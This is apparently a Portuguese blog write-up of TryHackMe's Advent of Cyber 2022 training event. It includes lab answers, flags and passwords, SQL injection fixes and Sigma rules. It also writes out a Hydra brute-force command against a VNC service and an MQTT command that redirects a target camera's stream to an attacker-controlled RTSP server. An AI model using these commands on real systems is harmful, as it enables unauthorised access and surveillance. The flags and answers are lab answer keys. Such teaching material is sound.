autenticação ou obtenção das informações armazenadas no banco de dados.\nPara resolver as questões de hoje, precisa-se alterar o código-fonte da aplicação de forma que remova a vulnerabilidade em quatro páginas diferentes, sendo que é explicado como fazer para as duas primeiras. Após fazer as alterações, o código precisa ser salvo clicando “CTRL + S” e verificado pelos elfos, caso não tenha mais a vulnerabilidade será fornecida a flag.\nA primeira questão pede para corrigir a vulnerabilidade do elf.php. Nesse código precisa ser alterado as linhas 4 e 17 para ser adicionado a função intval, que verificará se o valor inserido pelo usuário é um valor inteiro. A flag obtida é THM{McCode, Elf McCode}.\n// linha 4 $query=\"select * from users where id=\".$_GET['id']; $query=\"select * from users where id=\".intval($_GET['id']); // linha 17 $query=\"select * from toys where creator_id=\".$_GET['id']; $query=\"select * from toys where creator_id=\".intval($_GET['id']); Agora na questão 2 precisamos corrigir o search-toys.php. Aqui ao invés de só juntar o texto da query com os argumentos, será definido onde eles devem ser encaixados e o banco de dados fará isso de forma segura. A flag obtida é THM{KodeNRoll}.\n// linhas 4 e 5 antes $query=\"select * from toys where name like '%\".$_GET['q'].\"%' or description like '%\".$_GET['q'].\"%'\"; $toys_rs=mysqli_query($db,$query); $q = \"%\".$_GET['q'].\"%\"; $query=\"select * from toys where name like ? or description like ?\"; $stmt = mysqli_prepare($db, $query); mysqli_stmt_bind_param($stmt, 'ss', $q, $q); mysqli_stmt_execute($stmt); $toys_rs=mysqli_stmt_get_result($stmt); Na terceira questão as alterações são no toy.php. Assim como na primeira questão, só é necessário validar se a entrada é um número inteiro, então utiliza-se a mesma função intval. A flag obtida é THM{Are we secure yet?}.\n// linha 4 $query=\"select * from toys where id=\".$_GET['id']; $query=\"select * from toys where id=\".intval($_GET['id']); // linha 30 $query=\"select * from kids where assigned_toy_id=\".$_GET['id']; $query=\"select * from kids where assigned_toy_id=\".intval($_GET['id']); A última questão será para corrigir o login.php. Para essa questão a resolução é muito parecida com a da segunda. Os parâmetros não devem ser anexados a strings para formar a query mas fazer isso utilizando algumas funções. A flag obtida é THM{SQLi_who???}.\n// linhas 8 e 9 antes $query=\"select * from users where username='\".$username.\"' and password='\".$password.\"'\"; $users_rs=mysqli_query($db, $query); $query=\"select * from users where username= ? and password= ?\"; $stmt = mysqli_prepare($db, $query); mysqli_stmt_bind_param($stmt, 'ss', $username, $password); mysqli_stmt_execute($stmt); $users_rs=mysqli_stmt_get_result($stmt); [Day 17] Filtering for Order Amidst Chaos Seguindo em código seguro, hoje é explicado sobre expressões regulares (regex) para validação de cadeias de caracteres que podem ser inseridas pelo usuário. A partir de regex é possível criar linguagens regulares que serão interpretadas por um analisador léxico.\nPara as questões será necessário criar três expressões para definir nome de usuário, email e URL. Com as expressões será utilizado o utilitário egrep para analisar um arquivo que contém várias entradas.\nA primeira expressão que é pedida é para usuário. O usuário deve ser formado por caracteres alfanuméricos com tamanho entre 6 e 12. O regex que usaremos será o seguinte ^[a-zA-Z0-9]{6,12}$. ^ é utilizado para definir início de palavra, enquanto $ define o final, assim só casará com palavra formadas exclusivamente pela expressão. [] serve para definir um conjunto de caracteres que serão considerados, como queremos caracteres alfanuméricos pode ser letras minúsculas, maiúsculas e dígitos. E o {} define a quantidade mínima e máxima do item anterior.\nCom essa expressão encontramos 8 cadeias no arquivo, sendo que a única formada por palavra legível com número é User35, sendo estas as resposta para as questões 1 e 2 respectivamente.\nO próximo regex é para email, é informado que a primeira parte do email pode ser um conjunto aleatório de caracteres seguido pelo arroba, então um domínio e todos os top-level domains (tld) serão “.com”. Seguindo essas regras a expressão será ^.+@.+\\.com$. O caractere ponto ‘.’ significa, em regex, qualquer coisa, enquanto o mais ‘+’ exige um ou mais do anterior. Assim o ‘.+’ será uma cadeia de um ou mais caracteres aleatórios. E para que possamos utilizar o ponto em “.com” devemos escapar com o contra barra ‘'.\nAnalisando o arquivo com essa expressão é retornado 11 endereços de email, sendo de 7 domínios diferentes. As questões 5 e 6 pedem pelo domínio de dois usuários que são amg.com e fedfull.com. E a sétima questão pede pelo usuário do hotmail, que é o hussain.volt.\nA última expressão será para definir URLs. Elas devem começar com http ou https, podendo conter ou não o “www.”, um nome do domínio e devem terminar com um tld. Resultando em ^https?://(www.)?.+..+$. O ponto de interrogação ‘?’ é utilizado para indicar que o anterior é opcional e os () fazem com que o que está dentro seja analisado em conjunto. Com isso, tanto o ’s’ quanto o “www.” não são obrigatórios, o resto segue as mesmas lógicas de antes.\nEntão obtemos 16 URLs no total, com apenas 7 sendo “https”.\n[Day 18] Lumberjack Lenny Learns New Rules O dia 16 aborda as regras sigma para detecção de intrusão. O sigma é uma linguagem para descrever assinaturas para analisar os logs, dessa forma podendo encontrar potenciais ameaças.\nPara a resolução das questões, precisaremos criar regras sigma para detectar os seguintes indicadores de comprometimento mostrados abaixo. O primeiro é explicado como fazer na parte teórica da Task.\nA primeira regra deverá detectar a criação de contas locais no Windows. Então devemos buscar nos logs de segurança do Windows pelo EventID 4720. Dessa forma a regra fica como mostrada abaixo.\ntitle: account creation id: 1 status: experimental description: author: lukewicz date: modified: logsource: product: windows service: security category: detection: selection: EventID: - 4720 condition: selection Com a regra pronta, basta clicar em “Run” para testá-la. Então é retornado a flag THM{n0t_just_your_u$ser}. A segunda questão pede pela conta que foi criada, ao ver o log encontrado com essa regra encontramos o BanditYetiMini.\nSeguindo, a próxima regra é para descobrir se o adversário está buscando pelos softwares instalados no computador a partir dos Registros do Windows. Agora buscaremos no sysmon com o EventID 1, o aplicativo reg.exe e por comandos que contenham reg, query, /v e svcVersion.\ntitle: software discovery id: 2 status: experimental description: author: lukewicz date: modified: logsource: product: windows service: sysmon category: process_creation detection: selection: EventID: - 1 Image|endswith: - reg.exe CommandLine|contains|all: - reg - query - /v - svcVersion condition: selection Com essa regra obtemos a flag THM{wh@t_1s_Runn1ng_H3r3}. A questão 4 pede pelo usuário que foi encontrado no log do desafio 2, sendo este o SIGMA_AOC2022\\Bandit Yeti.\nA última regra é para achar a criação de tarefas agendadas no Windows. Como na anterior, buscaremos por logs do sysmon, mas agora que utilizem o Task Scheduler. Então a imagem deve ser schtasks.exe e o comando deve ter schtasks e /create.\ntitle: scheduled task id: 3 status: experimental description: author: lukewicz date: modified: logsource: product: windows service: sysmon category: process_creation detection: selection: EventID: - 1 Image|endswith: - schtasks.exe CommandLine|contains|all: - schtasks - /create condition: selection Com isso obtemos a flag THM{sch3dule_0npo1nt_101}. E por fim a última questão pede pelo hash associado ao log desse desafio, 2F6CE97FAF2D5EEA919E4393BDD416A7.\n[Day 19] Wiggles go brrr Na Task de hoje é explicado o básico de Hardware Hacking, buscando por informações nos sinais elétricos transmitidos pelos dispositivos. É explicado sobre os padrões de comunicação USART, SPI e I2C, além de ter uma parte prática para decodificar os sinais utilizando um software de simulação chamado Saleae.\nA primeira questão pede pelo dispositivo que é utilizado para examinar os sinais. Sendo este um logic analyser.\nAs questões 3 e 4 são um comparativo do USART com o SPI. Como é explicado acima na Task o USART é mais lento que o SPI, porém o SPI utiliza mais cabos para essa comunicação. Então as respostas são nay e yea.\nAs próximas três questões são comparando o I2C com os outros dois padrões anteriores. Segundo o texto, o I2C é mais rápido que o USART mas mais lento que o SPI, além de utilizar o mesmo número de fios que o USART então menos que o SPI. COnsiderando isso as respostas ficam nay, nay e yea.\nE como é citado no texto o I2C consegue atingir um máximo de 1008 conexões utilizando um único par de cabos, respondendo a sétima questão.\nAs últimas duas questões são práticas relacionadas ao arquivo de captura “santa” que pode ser analisado utilizando o software Logic 2.4.2 que estão na máquina anexada nessa Task.\nA questão 8 pede pela taxa de bauds que está sendo transmitida entre o microprocessador e a ESP32. Ao entrar na aba “Analyzers” e escolher a opção “Async Serial” é mostrado uma nova tela em que é informado a “Bit Rate” como sendo 9600.\nAgora para encontrarmos a flag que foi transmitida, escolhemos nessa mesma tela o canal ““00. Channel 0” como canal de input, o resto das configurações permanecem iguais. Assim ficamos com uma tela igual a esta.\nCom as configurações do analisador feitas podemos salvar. Então na aba “Analyzers” mudamos a visualização dos dados para “Terminal” clicando no ícone de terminal. Com isso podemos ler os dados transmitidos e no final está a flag THM{Hacking.Hardware.Is.Fun}.\n[Day 20] Binwalkin’ around the Christmas tree O vigésimo dia é sobre Firmware. Firmware é o software de mais baixo nível que faz a comunicação entre o hardware e os outros softwares do dispositivo. A Task de hoje é um passo a passo de como descriptografar um firmware para obter o código-fonte.\nAo logar na máquina temos dois firmwares, um deles mais recente e criptografado com o gpg e o outro mais antigo não criptografado. Na pasta do mais antigo, “~/bin-unsigned”, podemos extrair o conteúdo do “firmwarev1.0-unsigned” com o comando “extract-firmware.sh firmwarev1.0-unsigned”.\nCom o firmware extraído, podemos buscar por senhas que estavam armazenadas nele. Com o comando “grep -ir paraphrase” conseguimos encontrar uma senha, que está no diretório gpg que contém também uma chave pública e privada. A senha encontrada é Santa@2022 e é a resposta para a segunda pergunta.\nPodemos então importar para o gpg as chaves que obtivemos para poder desencriptar o outro firmware.\nCom esse firmware já desencriptado podemos extrair o conteúdo dele, assim como fizemos com o anterior.\nCom o grep novamente podemos buscar pela flag para responder a primeira questão e pelo versão da build para a última questão. Assim obtemos a flag THM{WE_GOT_THE_FIRMWARE_CODE} e a versão 2.6.31. O terminal acabou escondendo os ‘_’.\n[Day 21] Have yourself a merry little webcam O tópico de hoje é MQTT e IoT. MQTT é protocolo utilizado para comunicação com dispositivos IoT, ele se baseia em um modelo de publish/subscribe para enviar e receber mensagens.\nA primeira questão pede em qual porta o “Mosquitto” está rodando. Pesquisando no Google é possível ver que o MQTT por padrão utiliza a porta 1883.\nCom essa informação podemos utilizar o nmap para examinar essa porta, para obter as informações para as duas questões seguintes. O nmap encontra a versão do mosquitto como sendo 1.6.9 e o script consegue enumerar o “device/init”, então a resposta é y, como mostrado na imagem abaixo.\nAgora para conseguir a flag é um pouco mais complicado. Primeiro usaremos um docker para iniciar um servidor de RTSP utilizando o comando “docker run –rm -it –network=host aler9/rtsp-simple-server”.\nEntão publicaremos o nosso payload no dispositivo alvo utilizando o mosquitto_pub com o id, a URL do RTSP deve conter o ip da máquina atacante com um path qualquer. Assim o comando fica por exemplo “mosquitto_pub -h 10.10.157.94 -t device/PL52DK4FAPBFGX3J3QHC/cmd -m “””{“cmd”:“10”,“url”:“rtsp://10.10.100.41:8554/lukewicz”}””\" “.\nE para acessar as imagens podemos conectar utilizando o VLC passando como argumento o servidor que definimos anteriormente.\nEntão ao visualizar o vídeo encontramos a flag THM{UR_CAMERA_IS_MINE}.\n[Day 22] Threats are failing all around me No dia 22, é explicado sobre redução de superfície de ataque. Superfície de ataque são as áreas da vítima que podem ser utilizadas por um adversário para a realização de um ataque. Assim com a redução dela visa reduzir os vetores de ataque que possam comprometer o sistema.\nPara conseguir a flag de hoje é só inserir as respostas certas nas perguntas em uma página anexada a Task, como pode ser visto na imagem abaixo.\nCom a página anterior respondida, vamos clicar em “Next” para ir para outra página e conseguir a flag THM{4TT4CK SURF4C3 R3DUC3D}.\n[Day 23] Mission ELFPossible: Abominable for a Day Finalmente véspera da véspera de Natal, dia 23, hoje é explicado sobre defesa em profundidade. Esse é um conceito que visa utilizar várias formas de defesa para que caso uma falhe ainda existam outras para defender, uma vez que nenhuma defesa é insuperável. Para as flag tem um joguinho onde devemos invadir o escritório do Papai Noel para conseguir a lista de bons e maus.\nNo primeiro caso, com qualquer uma das desculpas o guarda libera o portão, então clicando nele entramos no complexo. Ao entrar no escritório do assistente executivo e abrir a primeira gaveta encontramos um senha guardada, S3cr3tV@ultPW.\nCom essa senha podemos ir no escritório do Papai Noel e desbloquear o cofre dele, com isso conseguimos a primeira flag, THM{EZ_fl@6!}, encerrando o primeiro caso.\nNo caso seguinte o guarda já está mais bem treinado, deste modo apenas a desculpa de que vai entregar algo para o assistente executivo faz o guarda permitir o acesso. Ao entrar podemos encontrar no Post-it do assistente a coisa favorita do Papai Noel, MilkAndCookies.\nCom isso podemos desbloquear o computador do Papai Noel que está no escritório dele e obter a partir de um arquivo de texto a senha do cofre, 3XtrR@_S3cr3tV@ultPW.\nAbrindo o cofre novamente encontramos a segunda flag, THM{m0@r_5t3pS_n0w!}, e terminamos esse caso.\nO terceiro caso é o mais complicado de todos, já que foram adotadas certas medidas de defesa em profundidade pela equipe do Papai Noel. Para passar pelo guarda ainda é que nem no caso anterior. Novamente no Post-it do assistente encontramos que a comida favorita dele é 3XtrR@_S3cr3tV@ultPW. E na primeira gaveta desse escritório podemos pegar o crachá do Papai Noel, que nos permitirá acessar mais áreas.\nA senha do notebook do assistente é a comida favorita dele. Ao logar no notebook encontramos um arquivo de texto e uma lixeira. No arquivo de texto encontramos a segunda metade da senha do cofre, Pr0v3dV@ultPW.\nE na lixeira encontramos a senha antiga do notebook do Papai Noel, H0tCh0coL@t3_01. Mas como ele é preguiçoso a nova senha é apenas incrementar o último dígito da antiga, H0tCh0coL@t3_02.\nTendo acessado o notebook dele com a senha nova, encontramos a primeira metade da senha do cofre, N3w4nd1m.\nDessa forma para criar a senha completa do cofre é só concatenar as duas, assim ficando N3w4nd1mPr0v3dV@ultPW. No cofre encontramos a terceira flag e o pin de acesso à Oficina do Papai Noel, respectivamente THM{B@d_Y3t1_1s_n@u6hty} e 2845.\nPor fim podemos acessar a oficina e conseguir a flag final, THM{D3f3n5e_1n_D3pth_1s_k00L!!}.\n[Day 24] Ho, ho, ho, the survey’s short / The Year of the Bandit Yeti O último dia não tem nenhum conteúdo novo e é dividido em duas Tasks. A primeira é para fornecer um feedback sobre como foi o evento e o que você achou. Enquanto a segunda é para contar o final da história.\nNa Task 29, para conseguir a flag é só fazer o formulário de feedback que será dado a flag THM{AoC2022!thank_you!}.\nEnquanto na Task 30, a única questão que tem é para responder Yea.\nConclusão Após responder todas as questões e ter 100% da sala concluída ganhamos o certificado de conclusão e uma badge do evento.\nAssim terminamos o Advent of Cyber do TryHackMe. Os conteúdos apresentados durante o evento foram de certa forma introdutórios voltados para pessoas que estão começando na área, e podem ser mais aprofundados a partir de outras salas do TryHackMe ou em outros materiais.\nEspero que esse meu Write-Up possa ter ajudado quem esteja em dúvida sobre algum dos desafios. Agradeço a todos que leram. Qualquer dúvida ou sugestão de melhoria é só entrar em contato comigo.\n",
  "wordCount" : "7511",
  "inLanguage": "pt",
  "datePublished": "2022-12-25T00:00:00Z",
  "dateModified": "2022-12-25T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Lucas Tomio Darim"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://tomiodarim.io/posts/advent-of-cyber-2022/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "tomiodarim",
    "logo": {
      "@type": "ImageObject",
      "url": "https://tomiodarim.io/images/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://tomiodarim.io/" accesskey="h" title="tomiodarim (Alt + H)">tomiodarim</a>
            
        </div>
        <div class="logo">
            <ul id="menu">
                <li>
                    <a href="https://tomiodarim.io/" title="home">
                        <span>home</span>
                    </a>
                </li>
                <li>
                    <a href="https://tomiodarim.io/whoami/" title="whoami">
                        <span>whoami</span>
                    </a>
                </li>
                <li>
                    <a href="https://tomiodarim.io/tags/" title="tags">
                        <span>tags</span>
                    </a>
                </li>
            </ul>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <h1 class="post-title">
      TryHackMe - Advent of Cyber 2022
    </h1>
    <div class="post-meta">25 de dezembro de 2022

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Sumário</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#day-1-someones-coming-to-town" aria-label="[Day 1] Someone&amp;rsquo;s coming to town!">[Day 1] Someone&rsquo;s coming to town!</a></li>
                <li>
                    <a href="#day-2-santas-naughty--nice-log" aria-label="[Day 2] Santa&amp;rsquo;s Naughty &amp;amp; Nice Log">[Day 2] Santa&rsquo;s Naughty &amp; Nice Log</a></li>
                <li>
                    <a href="#day-3-nothing-escapes-detective-mcred" aria-label="[Day 3] Nothing escapes detective McRed">[Day 3] Nothing escapes detective McRed</a></li>
                <li>
                    <a href="#day-4-scanning-through-the-snow" aria-label="[Day 4] Scanning through the snow">[Day 4] Scanning through the snow</a></li>
                <li>
                    <a href="#day-5-he-knows-when-youre-awake" aria-label="[Day 5] He knows when you&amp;rsquo;re awake">[Day 5] He knows when you&rsquo;re awake</a></li>
                <li>
                    <a href="#day-6-its-beginning-to-look-a-lot-like-phishing" aria-label="[Day 6] It&amp;rsquo;s beginning to look a lot like phishing">[Day 6] It&rsquo;s beginning to look a lot like phishing</a></li>
                <li>
                    <a href="#day-7-maldocs-roasting-on-an-open-fire" aria-label="[Day 7] Maldocs roasting on an open fire">[Day 7] Maldocs roasting on an open fire</a></li>
                <li>
                    <a href="#day-8-last-christmas-i-gave-you-my-eth" aria-label="[Day 8] Last Christmas I gave you my ETH">[Day 8] Last Christmas I gave you my ETH</a></li>
                <li>
                    <a href="#day-9-dock-the-halls" aria-label="[Day 9] Dock the halls">[Day 9] Dock the halls</a></li>
                <li>
                    <a href="#day-10-youre-a-mean-one-mr-yeti" aria-label="[Day 10] You&amp;rsquo;re a mean one, Mr. Yeti">[Day 10] You&rsquo;re a mean one, Mr. Yeti</a></li>
                <li>
                    <a href="#day-11-not-all-gifts-are-nice" aria-label="[Day 11] Not all gifts are nice">[Day 11] Not all gifts are nice</a></li>
                <li>
                    <a href="#day-12-forensic-mcblue-to-the-revscue" aria-label="[Day 12] Forensic McBlue to the REVscue!">[Day 12] Forensic McBlue to the REVscue!</a></li>
                <li>
                    <a href="#day-13-simply-having-a-wonderful-pcap-time" aria-label="[Day 13] Simply having a wonderful pcap time">[Day 13] Simply having a wonderful pcap time</a></li>
                <li>
                    <a href="#day-14-im-dreaming-of-secure-web-apps" aria-label="[Day 14] I&amp;rsquo;m dreaming of secure web apps">[Day 14] I&rsquo;m dreaming of secure web apps</a></li>
                <li>
                    <a href="#day-15-santa-is-looking-for-a-sidekick" aria-label="[Day 15] Santa is looking for a Sidekick">[Day 15] Santa is looking for a Sidekick</a></li>
                <li>
                    <a href="#day-16-sqlis-the-king-the-carolers-sing" aria-label="[Day 16] SQLi’s the king, the carolers sing">[Day 16] SQLi’s the king, the carolers sing</a></li>
                <li>
                    <a href="#day-17-filtering-for-order-amidst-chaos" aria-label="[Day 17] Filtering for Order Amidst Chaos">[Day 17] Filtering for Order Amidst Chaos</a></li>
                <li>
                    <a href="#day-18-lumberjack-lenny-learns-new-rules" aria-label="[Day 18] Lumberjack Lenny Learns New Rules">[Day 18] Lumberjack Lenny Learns New Rules</a></li>
                <li>
                    <a href="#day-19-wiggles-go-brrr" aria-label="[Day 19] Wiggles go brrr">[Day 19] Wiggles go brrr</a></li>
                <li>
                    <a href="#day-20-binwalkin-around-the-christmas-tree" aria-label="[Day 20] Binwalkin’ around the Christmas tree">[Day 20] Binwalkin’ around the Christmas tree</a></li>
                <li>
                    <a href="#day-21-have-yourself-a-merry-little-webcam" aria-label="[Day 21] Have yourself a merry little webcam">[Day 21] Have yourself a merry little webcam</a></li>
                <li>
                    <a href="#day-22-threats-are-failing-all-around-me" aria-label="[Day 22] Threats are failing all around me">[Day 22] Threats are failing all around me</a></li>
                <li>
                    <a href="#day-23-mission-elfpossible-abominable-for-a-day" aria-label="[Day 23] Mission ELFPossible: Abominable for a Day">[Day 23] Mission ELFPossible: Abominable for a Day</a></li>
                <li>
                    <a href="#day-24-ho-ho-ho-the-surveys-short--the-year-of-the-bandit-yeti" aria-label="[Day 24] Ho, ho, ho, the survey&amp;rsquo;s short / The Year of the Bandit Yeti">[Day 24] Ho, ho, ho, the survey&rsquo;s short / The Year of the Bandit Yeti</a></li>
                <li>
                    <a href="#conclus%c3%a3o" aria-label="Conclusão">Conclusão</a>
                </li>
            </ul>
        </div>
    </details>
</div>
  <div class="post-content"><p>Esse write-up será sobre sobre o Advent of Cyber 2022, que é o evento especial de natal do TryHackMe. Todos os dias a plataforma liberará algum desafio. Esse write-up só será publicado ao final do evento.</p>
<p>Nesse write-up não colocarei todo o conteúdo teórico apresentado nas Tasks, apenas um breve resumo e a explicação das questões. O evento pode ser acessado nesse <a href="https://tryhackme.com/room/adventofcyber4">link</a>.</p>
<p><img loading="lazy" src="/images/aoc2022/0.1.png" alt="Advent of Cyber 2022"  />
</p>
<p>E antes de começar gostaria de agradecer ao TryHackMe e a todos os envolvidos no desenvolvimento do evento pelos ótimos desafios e por todo conteúdo que pude aprender ou revisar.</p>
<p><img loading="lazy" src="/images/aoc2022/0.2.png" alt="Criadores"  />
</p>
<h2 id="day-1-someones-coming-to-town">[Day 1] Someone&rsquo;s coming to town!</h2>
<p>Nesse primeiro dia é explicado sobre alguns frameworks de segurança cibernética, sendo eles o NIST, ISO 27000, MITRE ATT&amp;CK, Cyber Kill Chain e Unified Kill Chain.
Há uma página que pode ser mostrada para encontrar as flags.</p>
<p><img loading="lazy" src="/images/aoc2022/1.1.png" alt="Página Inicial"  />
</p>
<p>Após clicar em start vamos para outra página com um quebra-cabeça, são ao todo 3 quebra-cabeças que podem ser resolvidos utilizando as dicas e o conhecimento sobre frameworks apresentado anteriormente, ou também é possível resolver pelo formato das peças.</p>
<p>Ao término dos 3, nos é mostrado uma página com uma flag e um culpado pelo ataque. Esse culpado está relacionado a história do evento deste ano.</p>
<p><img loading="lazy" src="/images/aoc2022/1.2.png" alt="Página Inicial"  />
</p>
<p>Na primeira questão é perguntado quem está atacando a rede do Papai Noel esse ano, e como podemos ver pela imagem acima da resolução dos quebra-cabeças a resposta é <strong>The Bandit Yeti</strong>.</p>
<p>A segunda questão pede a flag, que é a também mostrada na imagem anterior, <strong>THM{IT&rsquo;S A Y3T1 CHR1$TMA$}</strong>. Assim conclui-se o primeiro dia.</p>
<h2 id="day-2-santas-naughty--nice-log">[Day 2] Santa&rsquo;s Naughty &amp; Nice Log</h2>
<p>O conteúdo do segundo dia é relacionado a logs. É explicado um pouco o que são os logs, como são formados, onde são encontrados no Windows e no Linux. Além disso, também é explicado um pouco sobre o utilitário grep do Linux.</p>
<p>Há uma máquina em anexo a Task de hoje que pode ser acessada no navegador. As questões são referentes ao conteúdo dessa máquina.</p>
<p>A primeira questão é apenas ligar a máquina, que pode ser feito clicando no botão verde no início da Task. A segunda questão pede para usar o comando ls para saber quantos arquivos de log existem no diretório. Como pode ser visto na imagem abaixo o diretório possui apenas <strong>2</strong> arquivos de logs.</p>
<p><img loading="lazy" src="/images/aoc2022/2.1.png" alt="Arquivos de log"  />
</p>
<p>A terceira questão pede qual o nome do arquivo que tem os logs do servidor web. Pelos arquivos encontrados anteriormente um deles tem o nome <strong>webserver.log</strong> que é a resposta dessa questão.</p>
<p>A próxima questão pede em qual dia da semana a lista do Papai Noel foi roubada. Usando os comandos head e tail para ver, respectivamente, o início e fim do arquivo, é possível perceber que os logs são apenas do dia 18 de novembro. Então a lista foi roubada em uma sexta-feira, <strong>friday</strong>.</p>
<p>Agora é pedido qual o IP dos atacantes. Ainda pelo retorno dos comando head e tail, todas as requisições são de um mesmo IP, <strong>10.10.249.191</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/2.2.png" alt="Head e Tail do webserver.log"  />
</p>
<p>A sétima questão pede qual o nome da lista que foi roubada. Uma lista é provavelmente um arquivo de texto, logo terminaria com .txt. Então pode-se utilizar o regex \.txt, para escapar o &lsquo;.&rsquo; e buscar pelo literal .txt, assim casando com arquivos de texto. Portanto utilizando o grep com esse regex é possível achar uma requisição ao arquivo <strong>santaslist.txt</strong>, que é o arquivo que estávamos procurando.</p>
<p><img loading="lazy" src="/images/aoc2022/2.3.png" alt="Grep por arquivos de texto"  />
</p>
<p>Por fim, a última questão pede para achar uma flag nos arquivos de log. As flags do TryHackMe possuem o formato THM{&hellip;}, então basta usarmos grep por THM nos arquivos de log. Assim encontramos a flag <strong>THM{STOLENSANTASLIST}</strong> no arquivo SSHD.log.</p>
<p><img loading="lazy" src="/images/aoc2022/2.4.png" alt="Flag no SSHD.log"  />
</p>
<h2 id="day-3-nothing-escapes-detective-mcred">[Day 3] Nothing escapes detective McRed</h2>
<p>O terceiro dia é focado em OSINT, que é a busca de informações de fontes abertas. Nessa Task é explicado o básico de OSINT através de google dorks, whois lookup, robots.txt e outros.</p>
<p>A primeira questão pede pelo nome da registrar do domínio santagift.shop. Essa informação pode ser encontrada através do whois. Dessa forma ao pesquisar esse domínio no site who.is encontramos que o nome do registrar é <strong>NAMECHEAP INC</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/3.1.png" alt="Nome do Registrar"  />
</p>
<p>A próxima questão pede para encontrar uma flag em um código no github que contém credenciais sensíveis. Então pesquisando por &ldquo;santagift.shop&rdquo; nos códigos do github é encontra-se 3 códigos de uma conta chamada muhammadthm.</p>
<p><img loading="lazy" src="/images/aoc2022/3.2.png" alt="Busca no Github"  />
</p>
<p>E logo no início do config.php está a flag <strong>{THM_OSINT_WORKS}</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/3.3.png" alt="Flag no config.php"  />
</p>
<p>Com a informação anterior podemos responder a terceira questão que pede qual arquivo contém senhas. É o arquivo <strong>config.php</strong>, o mesmo que tem a flag anterior.</p>
<p>As duas últimas questões pedem pelo nome do servidor QA associado ao site e a senha do servidor QA. Essas informações podem ser encontradas ainda no config.php, um pouco mais abaixo da flag anterior. Sendo o servidor <strong>qa.santagift.shop</strong> e a senha <strong>S@nta2022</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/3.4.png" alt="Informações vazadas no config.php"  />
</p>
<h2 id="day-4-scanning-through-the-snow">[Day 4] Scanning through the snow</h2>
<p>No dia 4 é explicado sobre scanning, considerando network, port e vulnerability scanning e as ferramentas Nmap e Nikto.</p>
<p>Para realizar as questões precisa-se ligar uma máquina alvo. As duas primeiras flags são relacionadas ao scan das portas na máquina. E as outras duas sobre o conteúdo do SMB da máquina.</p>
<p>O nmap possui a opção -A para um scan que detecta o sistema operacional (OS), os software que estão rodando nas portas e roda os scripts padrão do Nmap Script Engine (NSE). E a opção -T4 para aumentar a velocidade do scan.</p>
<p>Para o scan dessa máquina usei o comando nmap -A -T4 &lt;ip&gt;. Assim, descobri que o servidor do HTTP é o <strong>Apache</strong> e que na porta 22 está sendo rodado o <strong>SSH</strong>. Sendo essas as respostas para as duas primeiras perguntas.</p>
<p><img loading="lazy" src="/images/aoc2022/4.1.png" alt="Port Scanning"  />
</p>
<p>Agora, a partir das credenciais encontradas na Task de ontem, podemos conectar no servidor SMB e baixar os arquivos. Para listar os volumes que estão sendo compartilhados nesse servidor, eu utilize o comando smbclient seguido por -U para definir o usuário e senha e o -L para o host.</p>
<p><img loading="lazy" src="/images/aoc2022/4.2.png" alt="Volumes do SMB"  />
</p>
<p>Então para acessar o volume utilizei o mesmo comando smbclient com o usuário e senha mas agora seguido pelo host e volume. Conectado no servidor, com o comando ls da para ver os arquivos e com get baixá-los.</p>
<p><img loading="lazy" src="/images/aoc2022/4.3.png" alt="Obtendo os arquivos do SMB"  />
</p>
<p>Com os arquivos localmente, é só usar o cat para mostrar o conteúdo. O arquivo flag.txt possui a flag <strong>{THM_SANTA_SMB_SERVER}</strong> resposta da terceira questão. E o arquivo userlist.txt possui alguns usuários e senhas, sendo <strong>santa25</strong> a senha do usuário que pede na última questão.</p>
<p><img loading="lazy" src="/images/aoc2022/4.4.png" alt="Conteúdo dos arquivos"  />
</p>
<h2 id="day-5-he-knows-when-youre-awake">[Day 5] He knows when you&rsquo;re awake</h2>
<p>No dia de hoje é explicado um pouco sobre serviços de acesso remoto, sendo estes SSH, RDP e VNC. E também sobre autenticação e ataques a senhas. Dessa forma as questões são relacionadas a fazer um brute-force em um servidor VNC.</p>
<p>A primeira questão pede a senha do VNC da máquina anexada a essa Task. Para descobrir essa senha, fiz um brute-force utilizando o Hydra e a wordlist rockyou.txt.
O comando que utilizei foi &ldquo;hydra -P /usr/share/wordlists/rockyou.txt -t 48 vnc://10.10.44.200&rdquo;, onde a opção -P é para selecionar a wordlist a ser usada, -t para aumentar o paralelismo assim acelerando a quantidade de tentativas e por fim o serviço e IP alvos.</p>
<p><img loading="lazy" src="/images/aoc2022/5.1.png" alt="Brute-force no servidor VNC"  />
</p>
